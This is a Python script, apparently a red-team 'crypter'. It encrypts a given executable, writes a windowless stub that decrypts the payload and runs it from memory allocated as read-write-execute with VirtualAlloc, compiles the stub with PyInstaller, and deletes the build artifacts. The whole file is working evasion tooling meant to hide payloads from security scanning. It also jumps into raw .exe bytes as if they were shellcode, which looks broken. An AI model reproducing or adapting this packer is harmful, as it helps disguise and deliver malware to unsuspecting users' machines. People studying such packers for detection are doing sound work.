from cryptography.fernet import Fernet
import subprocess
import os
import shutil
import sys

input_file = sys.argv[1]
input_filename_w_extention = os.path.basename(input_file)
# remove the .exe extension
input_filename = input_filename_w_extention[:-4]
output_filename = input_filename
output_path = os.getcwd()

# Encrypt the software
key = Fernet.generate_key()
cipher = Fernet(key)
with open(input_file, "rb") as f:
    encrypted_data = cipher.encrypt(f.read())

# decryptor code
decryptor_code = f"""
from cryptography.fernet import Fernet
import ctypes
from ctypes import *
import win32api

key = {key!r}
cipher = Fernet(key)

encrypted_data = {encrypted_data}

# Decrypt the content
decrypted_data = cipher.decrypt(encrypted_data)

# Set the argument and return types for VirtualAlloc
ctypes.windll.kernel32.VirtualAlloc.argtypes = [
    ctypes.c_void_p, ctypes.c_size_t, ctypes.c_uint32, ctypes.c_uint32
]
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p

# Allocate memory for the binary data
size = len(decrypted_data)
ptr = ctypes.windll.kernel32.VirtualAlloc(None, size, 0x3000, 0x40)
if not ptr:
    raise Exception("Failed to allocate memory")

# Write the binary data to memory
ctypes.memmove(ptr, decrypted_data, size)

# Create a function pointer to the memory and call it
func = ctypes.CFUNCTYPE(ctypes.c_void_p)
func_ptr = ctypes.cast(ptr, func)
func_ptr()

# Free memory
ctypes.windll.kernel32.VirtualFree(ctypes.c_void_p(ptr), 0, 0x8000)
"""

decryptor_script_path = f"{output_path}\RT_GEN_{output_filename}.pyw"

with open(decryptor_script_path, "w") as f:
    f.write(decryptor_code)

# Compile the decryptor code into an executable
subprocess.call(["pyinstaller", "--onefile", decryptor_script_path])

# Remove unnecessary files/folders generated by pyinstaller
os.remove(f'RT_GEN_{input_filename}.spec')
shutil.rmtree('build')
shutil.move(f'{output_path}\dist\RT_GEN_{input_filename}.exe', f'{output_path}\RT_GEN_{output_filename}.exe')
shutil.rmtree('dist')
os.remove(decryptor_script_path)